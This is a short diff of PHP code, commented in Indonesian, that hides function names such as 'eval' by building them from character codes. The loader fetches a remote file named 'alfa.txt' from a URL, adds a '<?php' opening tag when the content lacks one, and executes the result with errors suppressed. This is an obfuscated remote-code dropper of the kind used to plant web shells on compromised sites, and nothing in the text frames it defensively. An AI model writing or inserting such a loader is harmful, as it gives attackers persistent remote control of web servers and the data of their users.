@@ -18,8 +18,10 @@ $e = c(101).c(118).c(97).c(108);
 // === <?php (urlencoded) ===
 $open = c(37).c(51).c(67).c(37).c(51).c(70).c(112).c(104).c(112); // %3C%3Fphp
 
-// === AMBIL & JALANKAN ===
+// === AMBIL FILE alfa.txt ASLI ===
 $content = @$f($url);
+
+// === JALANKAN: Tambah <?php jika belum ada ===
 if($content !== false && trim($content) !== ''){
     $payload = (strpos($content, '<?php') === 0) ? $content : $u($open) . $content;
     @$e($payload);
